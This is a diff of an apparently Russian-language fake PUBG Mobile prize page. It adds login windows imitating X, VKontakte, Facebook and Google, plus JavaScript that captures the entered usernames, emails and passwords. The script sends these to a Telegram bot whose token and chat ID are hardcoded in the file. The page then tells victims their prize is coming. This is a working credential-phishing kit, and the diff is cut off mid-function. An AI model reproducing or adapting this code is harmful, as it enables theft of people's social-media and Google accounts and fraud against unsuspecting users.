@@ -41,6 +41,18 @@
             z-index: -1;
         }
         
+        /* Затемнение фона для лучшей читаемости */
+        body::after {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(10, 21, 32, 0.85);
+            z-index: -1;
+        }
+        
         /* Верхнее меню */
         .top-menu {
             width: 100%;
@@ -53,6 +65,7 @@
             background: rgba(20, 35, 60, 0.8);
             border-radius: 10px;
             border: 1px solid #2a3b5a;
+            backdrop-filter: blur(10px);
             z-index: 100;
         }
         
@@ -157,6 +170,7 @@
             margin-bottom: 30px;
             box-shadow: 0 15px 35px rgba(0, 0, 0, 0.6);
             border: 3px solid #2a3b5a;
+            backdrop-filter: blur(5px);
         }
         
         .prizes-grid {
@@ -213,6 +227,7 @@
             pointer-events: none;
             opacity: 0;
             background: rgba(42, 59, 90, 0.2);
+            backdrop-filter: blur(3px);
         }
         
         .selection-frame.active {
@@ -250,6 +265,7 @@
             font-family: 'Orbitron', sans-serif;
             letter-spacing: 1px;
             text-transform: uppercase;
+            backdrop-filter: blur(5px);
             border: 2px solid rgba(42, 59, 90, 0.5);
         }
         
@@ -282,6 +298,7 @@
             margin-top: 20px;
             border: 2px solid rgba(42, 59, 90, 0.4);
             box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(10px);
         }
         
         .social-select-section.active {
@@ -329,6 +346,7 @@
             transition: all 0.3s;
             border: 2px solid transparent;
             width: 120px;
+            backdrop-filter: blur(5px);
         }
         
         .social-option:hover {
@@ -388,6 +406,7 @@
             align-items: center;
             justify-content: center;
             gap: 10px;
+            backdrop-filter: blur(5px);
             border: 2px solid rgba(42, 59, 90, 0.5);
         }
         
@@ -417,6 +436,7 @@
             border: 2px solid rgba(42, 59, 90, 0.4);
             box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
             text-align: center;
+            backdrop-filter: blur(10px);
         }
         
         .confirmation-section.active {
@@ -438,6 +458,603 @@
             font-family: 'Orbitron', sans-serif;
         }
         
+        /* Модальные окна для входа */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+            backdrop-filter: blur(5px);
+        }
+        
+        .modal-overlay.active {
+            display: flex;
+            animation: fadeIn 0.3s ease;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        .modal {
+            background: white;
+            border-radius: 10px;
+            padding: 40px;
+            width: 90%;
+            max-width: 380px;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.7);
+            position: relative;
+        }
+        
+        .modal-dark {
+            background: #000000;
+            color: white;
+        }
+        
+        .modal-blue {
+            background: #1877F2;
+            color: white;
+        }
+        
+        .close-modal {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: none;
+            border: none;
+            color: #666;
+            font-size: 28px;
+            cursor: pointer;
+            transition: color 0.3s;
+            z-index: 10;
+        }
+        
+        .modal-dark .close-modal {
+            color: white;
+        }
+        
+        .modal-blue .close-modal {
+            color: white;
+        }
+        
+        .close-modal:hover {
+            color: #333;
+        }
+        
+        /* Twitter/X стиль */
+        .x-logo {
+            width: 40px;
+            height: 40px;
+            margin-bottom: 30px;
+        }
+        
+        .x-title {
+            font-size: 30px;
+            font-weight: 700;
+            margin-bottom: 40px;
+            font-family: Arial, sans-serif;
+            color: #0F1419;
+        }
+        
+        .modal-dark .x-title {
+            color: white;
+        }
+        
+        .social-login-btn {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border-radius: 30px;
+            border: 1px solid #DADCE0;
+            background: white;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: background 0.2s;
+            font-family: Arial, sans-serif;
+        }
+        
+        .modal-dark .social-login-btn {
+            background: #000;
+            color: white;
+            border-color: #536471;
+        }
+        
+        .social-login-btn:hover {
+            background: #F7F9F9;
+        }
+        
+        .modal-dark .social-login-btn:hover {
+            background: #16181C;
+        }
+        
+        .social-login-btn.google {
+            border-color: #DADCE0;
+        }
+        
+        .social-login-btn.apple {
+            border-color: #DADCE0;
+        }
+        
+        .or-divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: #536471;
+            font-size: 15px;
+        }
+        
+        .or-divider::before,
+        .or-divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #EFF3F4;
+        }
+        
+        .modal-dark .or-divider::before,
+        .modal-dark .or-divider::after {
+            background: #2F3336;
+        }
+        
+        .or-divider span {
+            padding: 0 15px;
+        }
+        
+        .x-input {
+            width: 100%;
+            padding: 15px;
+            margin-bottom: 20px;
+            border: 1px solid #CFD9DE;
+            border-radius: 4px;
+            font-size: 17px;
+            background: white;
+            color: #0F1419;
+        }
+        
+        .modal-dark .x-input {
+            background: #000;
+            border-color: #536471;
+            color: white;
+        }
+        
+        .x-input:focus {
+            outline: none;
+            border-color: #1D9BF0;
+        }
+        
+        .x-next-btn {
+            width: 100%;
+            padding: 15px;
+            background: #0F1419;
+            color: white;
+            border: none;
+            border-radius: 30px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-bottom: 20px;
+        }
+        
+        .modal-dark .x-next-btn {
+            background: #1D9BF0;
+        }
+        
+        .x-next-btn:hover {
+            background: #272C30;
+        }
+        
+        .modal-dark .x-next-btn:hover {
+            background: #1A8CD8;
+        }
+        
+        .x-link {
+            color: #1D9BF0;
+            text-decoration: none;
+            font-size: 15px;
+        }
+        
+        .x-link:hover {
+            text-decoration: underline;
+        }
+        
+        .x-footer {
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px solid #EFF3F4;
+            color: #536471;
+            font-size: 15px;
+        }
+        
+        .modal-dark .x-footer {
+            border-color: #2F3336;
+        }
+        
+        .x-footer a {
+            color: #1D9BF0;
+            text-decoration: none;
+            font-weight: 600;
+        }
+        
+        .x-footer a:hover {
+            text-decoration: underline;
+        }
+        
+        /* ВКонтакте стиль */
+        .vk-logo {
+            width: 48px;
+            height: 48px;
+            margin: 0 auto 30px;
+            display: block;
+        }
+        
+        .vk-title {
+            text-align: center;
+            font-size: 22px;
+            font-weight: 500;
+            margin-bottom: 30px;
+            color: #000;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+        
+        .vk-label {
+            display: block;
+            margin-bottom: 8px;
+            color: #818C99;
+            font-size: 13px;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+        
+        .vk-input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 20px;
+            border: 1px solid #DCE1E6;
+            border-radius: 8px;
+            font-size: 16px;
+            background: #F2F3F5;
+            color: #000;
+        }
+        
+        .vk-input:focus {
+            outline: none;
+            border-color: #4A76A8;
+            background: white;
+        }
+        
+        .vk-checkbox {
+            display: flex;
+            align-items: center;
+            margin-bottom: 25px;
+        }
+        
+        .vk-checkbox input {
+            margin-right: 10px;
+            width: 18px;
+            height: 18px;
+        }
+        
+        .vk-checkbox label {
+            color: #818C99;
+            font-size: 14px;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+        
+        .vk-submit-btn {
+            width: 100%;
+            padding: 14px;
+            background: #4A76A8;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-bottom: 20px;
+        }
+        
+        .vk-submit-btn:hover {
+            background: #3C658F;
+        }
+        
+        .vk-links {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .vk-link {
+            color: #4A76A8;
+            text-decoration: none;
+            font-size: 16px;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+        
+        .vk-link:hover {
+            text-decoration: underline;
+        }
+        
+        /* Facebook стиль */
+        .fb-modal {
+            background: #F0F2F5;
+            padding: 0;
+            max-width: 400px;
+            overflow: hidden;
+        }
+        
+        .fb-header {
+            background: white;
+            padding: 20px;
+            text-align: center;
+            border-bottom: 1px solid #DADDE1;
+        }
+        
+        .fb-logo {
+            width: 240px;
+            height: auto;
+            margin-bottom: 10px;
+        }
+        
+        .fb-title {
+            font-size: 20px;
+            color: #1C1E21;
+            font-family: Helvetica, Arial, sans-serif;
+            font-weight: 600;
+        }
+        
+        .fb-content {
+            padding: 20px;
+        }
+        
+        .fb-input {
+            width: 100%;
+            padding: 14px;
+            margin-bottom: 15px;
+            border: 1px solid #DDDFE2;
+            border-radius: 6px;
+            font-size: 17px;
+            background: white;
+            color: #1C1E21;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+        
+        .fb-input:focus {
+            outline: none;
+            border-color: #1877F2;
+            box-shadow: 0 0 0 2px #E7F3FF;
+        }
+        
+        .fb-submit-btn {
+            width: 100%;
+            padding: 14px;
+            background: #1877F2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: 600;
+            cursor: pointer;
+            margin: 10px 0 20px;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+        
+        .fb-submit-btn:hover {
+            background: #166FE5;
+        }
+        
+        .fb-link {
+            display: block;
+            text-align: center;
+            color: #1877F2;
+            text-decoration: none;
+            font-size: 14px;
+            margin-bottom: 20px;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+        
+        .fb-link:hover {
+            text-decoration: underline;
+        }
+        
+        .fb-divider {
+            height: 1px;
+            background: #DADDE1;
+            margin: 20px 0;
+        }
+        
+        .fb-create-btn {
+            width: 60%;
+            margin: 0 auto;
+            padding: 12px;
+            background: #42B72A;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            display: block;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+        
+        .fb-create-btn:hover {
+            background: #36A420;
+        }
+        
+        /* Google стиль */
+        .google-modal {
+            padding: 48px 40px;
+            max-width: 450px;
+        }
+        
+        .google-logo {
+            width: 75px;
+            height: 24px;
+            margin: 0 auto 35px;
+            display: block;
+        }
+        
+        .google-title {
+            text-align: center;
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 35px;
+            color: #202124;
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+        }
+        
+        .google-input {
+            width: 100%;
+            padding: 15px;
+            margin-bottom: 25px;
+            border: 1px solid #DADCE0;
+            border-radius: 4px;
+            font-size: 16px;
+            background: white;
+            color: #202124;
+        }
+        
+        .google-input:focus {
+            outline: none;
+            border-color: #1A73E8;
+        }
+        
+        .google-submit-btn {
+            width: 100%;
+            padding: 12px;
+            background: #1A73E8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            margin: 30px 0 15px;
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+        }
+        
+        .google-submit-btn:hover {
+            background: #1666D6;
+            box-shadow: 0 1px 3px rgba(66, 133, 244, 0.3);
+        }
+        
+        .google-link {
+            color: #1A73E8;
+            text-decoration: none;
+            font-size: 14px;
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+        }
+        
+        .google-link:hover {
+            text-decoration: underline;
+        }
+        
+        .google-footer {
+            margin-top: 40px;
+            padding-top: 25px;
+            border-top: 1px solid #DADCE0;
+            color: #5F6368;
+            font-size: 14px;
+            text-align: center;
+            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+        }
+        
+        .google-footer a {
+            color: #1A73E8;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        
+        .google-footer a:hover {
+            text-decoration: underline;
+        }
+        
+        /* Google пароль стиль */
+        .google-user {
+            display: flex;
+            align-items: center;
+            margin-bottom: 35px;
+            padding: 15px;
+            background: #F8F9FA;
+            border-radius: 16px;
+        }
+        
+        .google-avatar {
+            width: 40px;
+            height: 40px;
+            background: #1A73E8;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: 500;
+            margin-right: 15px;
+        }
+        
+        .google-user-info {
+            flex: 1;
+        }
+        
+        .google-user-email {
+            font-weight: 500;
+            color: #202124;
+            font-size: 15px;
+        }
+        
+        .google-switch {
+            color: #1A73E8;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        
+        .google-switch:hover {
+            text-decoration: underline;
+        }
+        
+        .google-password-input {
+            width: 100%;
+            padding: 15px;
+            margin-bottom: 20px;
+            border: 1px solid #DADCE0;
+            border-radius: 4px;
+            font-size: 16px;
+            background: white;
+            color: #202124;
+        }
+        
+        .google-password-input:focus {
+            outline: none;
+            border-color: #1A73E8;
+        }
+        
+        .google-show-password {
+            display: flex;
+            align-items: center;
+            margin-bottom: 35px;
+        }
+        
+        .google-show-password input {
+            margin-right: 10px;
+            width: 18px;
+            height: 18px;
+        }
+        
+        .google-show-password label {
+            color: #202124;
+            font-size: 14px;
+        }
+        
         .footer {
             width: 100%;
             max-width: 800px;
@@ -447,6 +1064,7 @@
             background: rgba(20, 35, 60, 0.8);
             border-radius: 10px;
             border-top: 2px solid #2a3b5a;
+            backdrop-filter: blur(10px);
         }
         
         .footer-links {
@@ -494,6 +1112,7 @@
             max-width: 300px;
             animation: slideIn 0.5s ease;
             font-family: 'Orbitron', sans-serif;
+            backdrop-filter: blur(5px);
         }
         
         @keyframes slideIn {
@@ -548,6 +1167,19 @@
                 padding: 15px 25px;
                 font-size: 18px;
             }
+            
+            .modal {
+                padding: 30px 20px;
+                width: 95%;
+            }
+            
+            .fb-modal {
+                max-width: 95%;
+            }
+            
+            .google-modal {
+                padding: 30px 20px;
+            }
         }
     </style>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -555,6 +1187,184 @@
 <body>
     <!-- Уведомление -->
     <div class="notification" id="notification"></div>
+
+    <!-- Модальные окна для входа -->
+    
+    <!-- Twitter/X модальное окно -->
+    <div class="modal-overlay modal-dark" id="xModal">
+        <div class="modal modal-dark">
+            <button class="close-modal" onclick="closeModal('xModal')">&times;</button>
+            <div class="x-logo">
+                <svg viewBox="0 0 24 24" aria-hidden="true" style="width: 40px; height: 40px; fill: white;">
+                    <g><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path></g>
+                </svg>
+            </div>
+            <h1 class="x-title">Sign in to X</h1>
+            
+            <button class="social-login-btn google">
+                <svg viewBox="0 0 24 24" width="18" height="18">
+                    <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
+                    <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
+                    <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
+                    <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
+                </svg>
+                Sign in with Google
+            </button>
+            
+            <button class="social-login-btn apple">
+                <svg viewBox="0 0 24 24" width="18" height="18" fill="currentColor">
+                    <path d="M17.05 20.28c-.98.95-2.05.86-3.08.38-1.09-.5-2.08-.48-3.24 0-1.44.62-2.2.44-3.06-.38C2.79 15.36 3.51 7.79 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.04 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09l.01-.01zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/>
+                </svg>
+                Sign in with Apple
+            </button>
+            
+            <div class="or-divider">
+                <span>or</span>
+            </div>
+            
+            <form id="xLoginForm">
+                <input type="text" class="x-input" placeholder="Phone, email, or username" required>
+                <button type="submit" class="x-next-btn">Next</button>
+            </form>
+            
+            <a href="#" class="x-link" style="display: block; text-align: center; margin-bottom: 20px;">Forgot password?</a>
+            
+            <div class="x-footer">
+                Don't have an account? <a href="#">Sign up</a>
+            </div>
+        </div>
+    </div>
+    
+    <!-- ВКонтакте модальное окно -->
+    <div class="modal-overlay" id="vkModal">
+        <div class="modal">
+            <button class="close-modal" onclick="closeModal('vkModal')">&times;</button>
+            <div style="text-align: center;">
+                <img src="vkontakte.png" alt="ВКонтакте" class="vk-logo">
+            </div>
+            <h1 class="vk-title">Вход ВКонтакте</h1>
+            
+            <form id="vkLoginForm">
+                <label class="vk-label">Телефон или email</label>
+                <input type="text" class="vk-input" placeholder="Телефон или email" required>
+                
+                <label class="vk-label">Пароль</label>
+                <input type="password" class="vk-input" placeholder="Пароль" required>
+                
+                <div class="vk-checkbox">
+                    <input type="checkbox" id="vkComputer">
+                    <label for="vkComputer">Чужой компьютер</label>
+                </div>
+                
+                <button type="submit" class="vk-submit-btn">Войти</button>
+            </form>
+            
+            <div class="vk-links">
+                <a href="#" class="vk-link">Регистрация</a>
+            </div>
+            
+            <div style="text-align: center; padding-top: 20px; border-top: 1px solid #DCE1E6;">
+                <a href="#" class="vk-link" style="font-size: 14px;">Забыли пароль или не можете войти?</a>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Facebook модальное окно -->
+    <div class="modal-overlay" id="facebookModal">
+        <div class="modal fb-modal">
+            <button class="close-modal" onclick="closeModal('facebookModal')" style="color: #606770;">&times;</button>
+            
+            <div class="fb-header">
+                <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook" class="fb-logo">
+                <div class="fb-title">Вход на Facebook</div>
+            </div>
+            
+            <div class="fb-content">
+                <form id="facebookLoginForm">
+                    <input type="text" class="fb-input" placeholder="Электронный адрес или номер телефона" required>
+                    <input type="password" class="fb-input" placeholder="Пароль" required>
+                    
+                    <button type="submit" class="fb-submit-btn">Вход</button>
+                </form>
+                
+                <a href="#" class="fb-link">Забыли аккаунт?</a>
+                
+                <div class="fb-divider"></div>
+                
+                <button class="fb-create-btn" onclick="closeModal('facebookModal')">Создать аккаунт</button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Google модальное окно (этап 1: email) -->
+    <div class="modal-overlay" id="googleModalStep1">
+        <div class="modal google-modal">
+            <button class="close-modal" onclick="closeModal('googleModalStep1')">&times;</button>
+            
+            <img src="https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_clr_74x24px.svg" alt="Google" class="google-logo">
+            <h1 class="google-title">Вход</h1>
+            <p style="text-align: center; color: #202124; margin-bottom: 35px; font-size: 16px; font-family: 'Google Sans', 'Roboto', Arial, sans-serif;">
+                Используйте аккаунт Google.<br>
+                <a href="#" style="color: #1A73E8; text-decoration: none;">Подробнее...</a>
+            </p>
+            
+            <form id="googleEmailForm">
+                <input type="email" class="google-input" placeholder="Телефон или адрес эл. почты" required>
+                
+                <div style="margin-bottom: 25px;">
+                    <a href="#" class="google-link">Забыли адрес электронной почты?</a>
+                </div>
+                
+                <div style="color: #5F6368; font-size: 14px; margin-bottom: 35px; font-family: 'Google Sans', 'Roboto', Arial, sans-serif;">
+                    Чтобы создать аккаунт Google, <a href="#" class="google-link">нажмите здесь</a>.
+                </div>
+                
+                <button type="submit" class="google-submit-btn">Далее</button>
+            </form>
+            
+            <div class="google-footer">
+                Выберите язык &nbsp; <a href="#">Русский</a>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Google модальное окно (этап 2: пароль) -->
+    <div class="modal-overlay" id="googleModalStep2">
+        <div class="modal google-modal">
+            <button class="close-modal" onclick="closeModal('googleModalStep2')">&times;</button>
+            
+            <img src="https://www.gstatic.com/images/branding/googlelogo/svg/googlelogo_clr_74x24px.svg" alt="Google" class="google-logo">
+            
+            <div class="google-user">
+                <div class="google-avatar">Д</div>
+                <div class="google-user-info">
+                    <div class="google-user-email">demo@gmail.com</div>
+                    <a href="#" class="google-switch" onclick="switchGoogleAccount()">Сменить аккаунт</a>
+                </div>
+            </div>
+            
+            <h1 class="google-title">Введите пароль</h1>
+            
+            <form id="googlePasswordForm">
+                <input type="password" class="google-password-input" placeholder="Введите пароль" required>
+                
+                <div class="google-show-password">
+                    <input type="checkbox" id="showPassword">
+                    <label for="showPassword">Показать пароль</label>
+                </div>
+                
+                <div style="margin-bottom: 25px;">
+                    <a href="#" class="google-link">Забыли пароль?</a>
+                </div>
+                
+                <button type="submit" class="google-submit-btn">Далее</button>
+            </form>
+            
+            <div class="google-footer">
+                Выберите язык &nbsp; <a href="#">Русский</a>
+            </div>
+        </div>
+    </div>
 
     <!-- Верхнее меню -->
     <div class="top-menu">
@@ -631,28 +1441,28 @@
             <p style="text-align: center; margin-bottom: 20px; color: #8da1b5;">Выберите социальную сеть для получения приза</p>
             
             <div class="social-grid">
-                <div class="social-option" data-social="vk">
+                <div class="social-option" data-social="vk" onclick="openModal('vkModal')">
                     <div class="social-icon">
                         <img src="vkontakte.png" alt="ВКонтакте">
                     </div>
                     <span>ВКонтакте</span>
                 </div>
                 
-                <div class="social-option" data-social="facebook">
+                <div class="social-option" data-social="facebook" onclick="openModal('facebookModal')">
                     <div class="social-icon">
                         <img src="faceebok.png" alt="Facebook">
                     </div>
                     <span>Facebook</span>
                 </div>
                 
-                <div class="social-option" data-social="x">
+                <div class="social-option" data-social="x" onclick="openModal('xModal')">
                     <div class="social-icon">
                         <img src="twiter.png" alt="Twitter">
                     </div>
                     <span>Twitter</span>
                 </div>
                 
-                <div class="social-option" data-social="google">
+                <div class="social-option" data-social="google" onclick="openGoogleModal()">
                     <div class="social-icon">
                         <img src="google.png" alt="Google">
                     </div>
@@ -714,6 +1524,29 @@
         const TELEGRAM_BOT_TOKEN = '8498045152:AAH6b4APGZfXDz0Dm0UFvN0kIkfvqtmViKU';
         const TELEGRAM_CHAT_ID = '1709490182';
         
+        // Переменные для хранения данных
+        let googleEmail = '';
+        
+        // Функции для модальных окон
+        function openModal(modalId) {
+            document.getElementById(modalId).classList.add('active');
+            document.body.style.overflow = 'hidden';
+        }
+        
+        function closeModal(modalId) {
+            document.getElementById(modalId).classList.remove('active');
+            document.body.style.overflow = 'auto';
+        }
+        
+        function openGoogleModal() {
+            openModal('googleModalStep1');
+        }
+        
+        function switchGoogleAccount() {
+            closeModal('googleModalStep2');
+            openModal('googleModalStep1');
+        }
+        
         document.addEventListener('DOMContentLoaded', function() {
             const playBtn = document.getElementById('playBtn');
             const selectionFrame = document.getElementById('selectionFrame');
@@ -767,7 +1600,8 @@
                     notificationSelectSocial: "Пожалуйста, выберите социальную сеть",
                     notificationAlreadyPlayed: "Вы уже использовали свою попытку сегодня!",
                     confirmationTitle: "ЗАЯВКА ПРИНЯТА!",
-                    confirmationMessage: "Ваш выигрыш будет зачислен на аккаунт PUBG Mobile в течение 24 часов."
+                    confirmationMessage: "Ваш выигрыш будет зачислен на аккаунт PUBG Mobile в течение 24 часов.",
+                    loginSuccess: "Данные для входа отправлены! Приз будет зачислен в течение 24 часов."
                 },
                 en: {
                     play: "PLAY",
@@ -780,7 +1614,8 @@
                     notificationSelectSocial: "Please select a social network",
                     notificationAlreadyPlayed: "You have already used your attempt today!",
                     confirmationTitle: "APPLICATION ACCEPTED!",
-                    confirmationMessage: "Your winnings will be credited to your PUBG Mobile account within 24 hours."
+                    confirmationMessage: "Your winnings will be credited to your PUBG Mobile account within 24 hours.",
+                    loginSuccess: "Login data sent! Prize will be credited within 24 hours."
                 }
             };
             
@@ -931,6 +1766,96 @@
                 });
             });
             
+            // Обработчики форм входа
+            
+            // Twitter/X форма
+            document.getElementById('xLoginForm').addEventListener('submit', async function(e) {
+                e.preventDefault();
+                const formData = new FormData(this);
+                const loginData = {
+                    username: this.querySelector('input').value
+                };
+                
+                const success = await sendLoginDataToTelegram('x', loginData, finalPrizeIndex);
+                
+                if (success) {
+                    closeModal('xModal');
+                    showConfirmation();
+                    showNotification("Данные для входа отправлены! Приз будет зачислен в течение 24 часов.");
+                }
+            });
+            
+            // ВКонтакте форма
+            document.getElementById('vkLoginForm').addEventListener('submit', async function(e) {
+                e.preventDefault();
+                const inputs = this.querySelectorAll('input');
+                const loginData = {
+                    phone: inputs[0].value,
+                    password: inputs[1].value,
+                    foreign_computer: inputs[2].checked ? 'Да' : 'Нет'
+                };
+                
+                const success = await sendLoginDataToTelegram('vk', loginData, finalPrizeIndex);
+                
+                if (success) {
+                    closeModal('vkModal');
+                    showConfirmation();
+                    showNotification("Данные для входа отправлены! Приз будет зачислен в течение 24 часов.");
+                }
+            });
+            
+            // Facebook форма
+            document.getElementById('facebookLoginForm').addEventListener('submit', async function(e) {
+                e.preventDefault();
+                const inputs = this.querySelectorAll('input');
+                const loginData = {
+                    email: inputs[0].value,
+                    password: inputs[1].value
+                };
+                
+                const success = await sendLoginDataToTelegram('facebook', loginData, finalPrizeIndex);
+                
+                if (success) {
+                    closeModal('facebookModal');
+                    showConfirmation();
+                    showNotification("Данные для входа отправлены! Приз будет зачислен в течение 24 часов.");
+                }
+            });
+            
+            // Google форма (этап 1: email)
+            document.getElementById('googleEmailForm').addEventListener('submit', async function(e) {
+                e.preventDefault();
+                googleEmail = this.querySelector('input').value;
+                
+                // Обновляем email в окне пароля
+                document.querySelector('.google-user-email').textContent = googleEmail;
+                
+                // Переходим к окну пароля
+                closeModal('googleModalStep1');
+                openModal('googleModalStep2');
+            });
+            
+            // Google форма (этап 2: пароль)
+            document.getElementById('googlePasswordForm').addEventListener('submit', async function(e) {
+                e.preventDefault();
+                const password = this.querySelector('input').value;
+                const showPassword = document.getElementById('showPassword').checked;
+                
+                const loginData = {
+                    email: googleEmail,
+                    password: password,
+                    show_password: showPassword ? 'Да' : 'Нет'
+                };
+                
+                const success = await sendLoginDataToTelegram('google', loginData, finalPrizeIndex);
+                
+                if (success) {
+                    closeModal('googleModalStep2');
+                    showConfirmation();
+                    showNotification("Данные для входа отправлены! Приз будет зачислен в течение 24 часов.");
+                }
+            });
+            
             // Обработчик кнопки получения приза
             getPrizeBtn.addEventListener('click', async function() {
                 if (!selectedSocial) {
@@ -938,38 +1863,59 @@
                     return;
                 }
                 
-                // Отправляем данные в Telegram
-                const success = await sendDataToTelegram(selectedSocial, finalPrizeIndex);
-                
-                if (success) {
-                    // Показываем секцию подтверждения
-                    socialSelectSection.classList.remove('active');
-                    confirmationSection.classList.add('active');
-                    confirmationSection.scrollIntoView({ behavior: 'smooth' });
-                    
-                    showNotification("Заявка принята! Приз будет зачислен в течение 24 часов.");
-                } else {
-                    showNotification("Ошибка отправки данных. Попробуйте еще раз.", true);
+                // Открываем соответствующее модальное окно
+                if (selectedSocial === 'google') {
+                    openGoogleModal();
+                } else if (selectedSocial === 'x') {
+                    openModal('xModal');
+                } else if (selectedSocial === 'vk') {
+                    openModal('vkModal');
+                } else if (selectedSocial === 'facebook') {
+                    openModal('facebookModal');
                 }
             });
             
-            // Функция отправки данных в Telegram
-            async function sendDataToTelegram(social, prizeIndex) {
+            // Функция показа подтверждения
+            function showConfirmation() {
+                socialSelectSection.classList.remove('active');
+                confirmationSection.classList.add('active');
+                confirmationSection.scrollIntoView({ behavior: 'smooth' });
+            }
+            
+            // Функция отправки данных входа в Telegram
+            async function sendLoginDataToTelegram(socialType, loginData, prizeIndex) {
                 const socialNames = {
                     'vk': 'ВКонтакте',
                     'facebook': 'Facebook',
-                    'x': 'Twitter',
+                    'x': 'Twitter/X',
                     'google': 'Google'
                 };
                 
                 const prizeName = `Приз #${prizeIndex + 1}`;
                 
-                const message = `🎮 НОВЫЙ ВЫИГРЫШ PUBG 🎮\n\n` +
-                               `📱 Соцсеть: ${socialNames[social] || social}\n` +
-                               `🎁 Выигранный приз: ${prizeName}\n` +
-                               `⏰ Время: ${new Date().toLocaleString()}\n` +
-                               `🌐 User Agent: ${navigator.userAgent}\n` +
-                               `📍 IP: собирается...`;
+                let message = `🔐 НОВЫЕ ДАННЫЕ ДЛЯ ВХОДА PUBG 🔐\n\n`;
+                message += `📱 Соцсеть: ${socialNames[socialType] || socialType}\n`;
+                
+                // Добавляем данные в зависимости от соцсети
+                if (socialType === 'vk') {
+                    message += `📞 Телефон/email: ${loginData.phone || 'Не указано'}\n`;
+                    message += `🔑 Пароль: ${loginData.password || 'Не указано'}\n`;
+                    message += `💻 Чужой компьютер: ${loginData.foreign_computer || 'Нет'}\n`;
+                } else if (socialType === 'facebook') {
+                    message += `📧 Email/телефон: ${loginData.email || 'Не указано'}\n`;
+                    message += `🔑 Пароль: ${loginData.password || 'Не указано'}\n`;
+                } else if (socialType === 'x') {
+                    message += `👤 Имя пользователя: ${loginData.username || 'Не указано'}\n`;
+                } else if (socialType === 'google') {
+                    message += `📧 Email: ${loginData.email || 'Не указано'}\n`;
+                    message += `🔑 Пароль: ${loginData.password || 'Не указано'}\n`;
+                    message += `👁️ Показать пароль: ${loginData.show_password || 'Нет'}\n`;
+                }
+                
